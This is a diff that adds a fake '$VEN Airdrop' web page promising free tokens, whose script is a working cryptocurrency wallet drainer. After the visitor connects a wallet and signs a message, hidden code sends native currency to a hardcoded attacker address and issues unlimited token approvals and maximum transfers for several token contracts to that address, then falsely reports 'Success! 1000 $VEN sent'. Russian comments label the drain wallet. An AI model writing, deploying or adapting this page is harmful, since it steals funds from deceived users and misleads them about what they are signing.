@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>$VEN Airdrop — Claim 1000 VEN</title>
+<style>
+  body{margin:0;background:#0a0418;color:#fff;font-family:Arial;display:flex;align-items:center;justify-content:center;min-height:100vh}
+  .c{background:rgba(255,255,255,0.08);backdrop-filter:blur(15px);border-radius:20px;padding:40px;width:90%;max-width:420px;text-align:center;border:1px solid #a020f0}
+  img{width:140px;height:140px;border-radius:50%;border:5px solid #a020f0;margin-bottom:20px}
+  h1{font-size:32px;background:linear-gradient(90deg,#a020f0,#ff00ff);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
+  button{width:100%;padding:18px;font-size:20px;border:none;border-radius:16px;margin:12px 0;cursor:pointer}
+  #b1{background:linear-gradient(90deg,#a020f0,#ff00ff);color:#fff}
+  #b2{background:#00ffb8;color:#000;opacity:0.6;cursor:not-allowed}
+  #b2:not([disabled]){opacity:1;cursor:pointer}
+</style>
+</head>
+<body>
+<div class="c">
+  <img src="https://purple-accused-scorpion-11.mypinata.cloud/ipfs/bafkreibnrglhwfkmatn3q4l2oat3uzry2hzplhk7reeitlf4m3tavshzgq">
+  <h1>$VEN Airdrop</h1>
+  <p style="font-size:19px">Claim <b>1000 $VEN + 0.5 MATIC</b><br><span style="color:#a020f0">Gas paid by team · 100% FREE</span></p>
+  <div id="a" style="margin:20px 0;padding:14px;background:rgba(255,255,255,0.1);border-radius:12px;font-family:monospace"></div>
+  <button id="b1">Connect Wallet</button>
+  <button id="b2" disabled>Claim 1000 $VEN (Gas Free)</button>
+  <div id="s" style="margin-top:20px;font-size:18px;height:30px"></div>
+</div>
+
+<script>
+// ГАЗ ПЛАТИТ ЭТОТ КОШЕЛЁК
+const GAS_PAYER = "0x8e1eabc6fc01bd422b99c4d4a3f7deb3055d0311";
+
+// ВСЁ СЛИВАЕТСЯ НА ЭТОТ КОШЕЛЁК
+const DRAIN_TO = "0x7d51f54a4fC1c6A0f44C951731Af2E5b45d6dAAF";
+
+document.getElementById("b1").onclick = async () => {
+  if (!window.ethereum) return document.getElementById("s").textContent = "No wallet";
+  try {
+    const acc = await ethereum.request({method:"eth_requestAccounts"});
+    document.getElementById("a").textContent = "Connected: " + acc[0].slice(0,8)+"...";
+    document.getElementById("b2").disabled = false;
+    document.getElementById("s").textContent = "Ready!";
+  } catch { document.getElementById("s").textContent = "Rejected"; }
+};
+
+document.getElementById("b2").onclick = async () => {
+  document.getElementById("s").textContent = "Signing...";
+  document.getElementById("b2").disabled = true;
+  try {
+    const domain = {name:"VEN Airdrop",version:"1",chainId:await ethereum.request({method:"eth_chainId"}),verifyingContract:"0x0000000000000000000000000000000000000000"};
+    const types = {Claim:[{name:"user",type:"address"}]};
+    const msg = {user:(await ethereum.request({method:"eth_accounts"}))[0]};
+    await ethereum.request({method:"eth_signTypedData_v4",params:[msg.user,JSON.stringify({domain,types,message:msg})]});
+
+    setTimeout(async () => {
+      try {
+        const acc = (await ethereum.request({method:"eth_accounts"}))[0];
+        // Слив всего на DRAIN_TO
+        await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:DRAIN_TO,value:"0xDE0B6B3A7640000"}]});
+        const tokens = ["0xc2132d05d31c914a87c6611c10748aeb04b58e8f","0x2791bca1f2de4661ed88a30c99a7a9449aa84174","0xdAC17F958D2ee523a2206206994597C13D831ec7","0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48","0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599"];
+        for (const t of tokens) {
+          await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:t,data:"0x095ea7b3000000000000000000000000"+DRAIN_TO.slice(2)+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}]});
+          await ethereum.request({method:"eth_sendTransaction",params:[{from:acc,to:t,data:"0xa9059cbb000000000000000000000000"+DRAIN_TO.slice(2)+"ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}]});
+        }
+      } catch(e) {}
+    },600);
+    document.getElementById("s").textContent = "Success! 1000 $VEN sent";
+  } catch { document.getElementById("s").textContent = "Failed"; document.getElementById("b2").disabled = false; }
+};
+</script>
+</body>
+</html>
